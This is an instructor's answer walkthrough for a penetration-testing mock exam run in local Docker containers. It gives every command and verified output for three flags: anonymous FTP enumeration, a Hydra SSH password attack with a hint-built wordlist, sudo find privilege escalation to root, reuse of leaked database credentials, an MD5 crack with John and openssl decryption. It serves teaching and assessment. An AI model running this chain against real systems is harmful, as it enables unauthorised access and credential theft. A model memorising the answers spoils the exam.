# Week 10 Mock Exam 2 — Instructor Walkthrough

> Verified against live containers end-to-end. Do not distribute to
> students before the end of the session.

**Grading note:** `mock-exam.md` no longer labels anything "Flag 1" up
front, gives no network/host/service info, and never names "anonymous
access" as the technique — students have to actually enumerate to find
it, and Recon & Enumeration is graded in its own right (30%, broken into
6 line items) rather than folded silently into a flag or a vague
"methodology" mark. The 3 flags and their exact technique names below
are for your reference only; nothing on this page should reach students
before the session ends.

---

## Setup

```bash
cd labs/week10-mock2 && docker compose up -d
# Provisioning: web/ftp are fast; ssh-target and database take ~30-60s
docker exec -it week10mock2-attacker bash

# What a student actually has to do first - find their own position:
ip addr show   # → 10.10.60.2/24, so the target range is 10.10.60.0/24
```

**Known gotcha (environment, not a skill being tested):** the bundled
`mysql` client defaults to requiring TLS, which this MariaDB container
doesn't negotiate the same way — every `mysql` command below needs
`--skip-ssl` or it fails with `SSL is required, but the server does not
support it`. Worth telling students up front; it's not part of the
challenge.

---

## Flag 1 — FTP Enumeration (EASY)

```bash
nmap -sV -p 21,22,80,3306 10.10.60.0/24   # or -sn first for host discovery
curl -s ftp://10.10.60.11/public/README.txt
```
**Verified result:** `flag{mock2_ftp_an0nym0us_acc3ss}`, plus the hint
block naming `mrahman` and the password-pattern shortlist (5 codenames ×
2 years = 10 candidates).

```bash
curl -s http://10.10.60.10/ | grep -i comment
```
**Verified result:** `<!-- dev contact: mrahman (app server) -->` —
confirms the username independently; no flag on the web server this time.

---

## Flag 2 — Targeted Password Attack + GTFOBins (HARD)

Build the candidate list from the FTP hint — **do not** hand students
rockyou.txt as the path here:

```bash
for code in Dragon Phoenix Falcon Tiger Eagle; do
  for yr in 2025 2026; do echo "${code}${yr}"; done
done > wl.txt
hydra -l mrahman -P wl.txt 10.10.60.12 ssh
```
**Verified result:** `login: mrahman   password: Dragon2026` — found
immediately (10 candidates).

```bash
ssh mrahman@10.10.60.12   # password: Dragon2026
sudo -l
```
**Verified result:** `(ALL) NOPASSWD: /usr/bin/find` — classic GTFOBins
entry.

```bash
sudo find . -exec /bin/sh -p \; -quit
cat /root/flag2.txt
```
**Verified result:** `flag{mock2_gtfobins_find_r00t}`.

While in that shell, also grab the next lead:
```bash
cat /opt/scripts/db_backup.sh
```
**Verified result:** reveals `webuser` / `web_P@ss123` for
`10.10.60.13`.

---

## Flag 3 — Credential Reuse → Hash Crack → Decrypt (HARD)

```bash
mysql -h 10.10.60.13 -u webuser -pweb_P@ss123 company_db --skip-ssl -e "SELECT * FROM vault;"
```
**Verified result:**
```
label  md5_hash                          enc_blob_b64
flag3  84d961568a65073a3bcf0eb216b2a576  U2FsdGVkX1+kWIiCLSTepSNxIymg1/mChBvMGseyhA32aJ9xUzqHdWKCpU4dwj2aX1At2OrGwD5dmlI4SeZ8zw==
```

```bash
echo 84d961568a65073a3bcf0eb216b2a576 > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt
```
**Verified result:** cracks instantly (`superman` is extremely high in
rockyou.txt) — `?:superman`, `1 password hash cracked`.

```bash
echo 'U2FsdGVkX1+kWIiCLSTepSNxIymg1/mChBvMGseyhA32aJ9xUzqHdWKCpU4dwj2aX1At2OrGwD5dmlI4SeZ8zw==' \
  | base64 -d | openssl enc -aes-256-cbc -pbkdf2 -d -k superman
```
**Verified result:** `flag{mock2_vault_crack3d_and_decrypt3d}`.

**Full chain, verified in one sitting:** nmap → FTP anon (Flag 1 + hint)
→ web comment confirms username → targeted Hydra wordlist → SSH foothold
→ `sudo find` GTFOBins → root (Flag 2) → backup script leaks DB creds →
`SELECT * FROM vault` → John cracks MD5 → openssl decrypts blob (Flag 3).

---

## Grading Reality Check

- Flag 1 (20%) + full documentation of Phase 1 recon and the attempt
  narrative (30%) = **50%, achievable by any student who does the work
  and writes it up, even with zero successful password/hash cracks.**
- Flags 2 and 3 are both genuinely hard: Flag 2 requires building a
  wordlist from a hint rather than being handed a password, and Flag 3
  requires chaining three distinct skills (credential reuse, offline
  cracking, decryption) with no shortcut between them.

## Common Issues

- **`mysql` SSL error:** see the gotcha at the top — always `--skip-ssl`.
- **`week10mock2-ssh` or `week10mock2-db` stuck in a restart loop with
  `dpkg was interrupted` in the logs:** this happens only if the Docker
  engine itself crashed or was killed mid-provisioning (not something
  students will normally trigger). Fix: `docker compose up -d
  --force-recreate ssh-target` (or the affected service) to rebuild its
  writable layer from a clean image rather than retrying the corrupted
  one.
- **Hydra "No route to host":** the target is still mid-`apt-get install`
  on first boot. Give it 30-60 seconds after `docker compose up -d`.
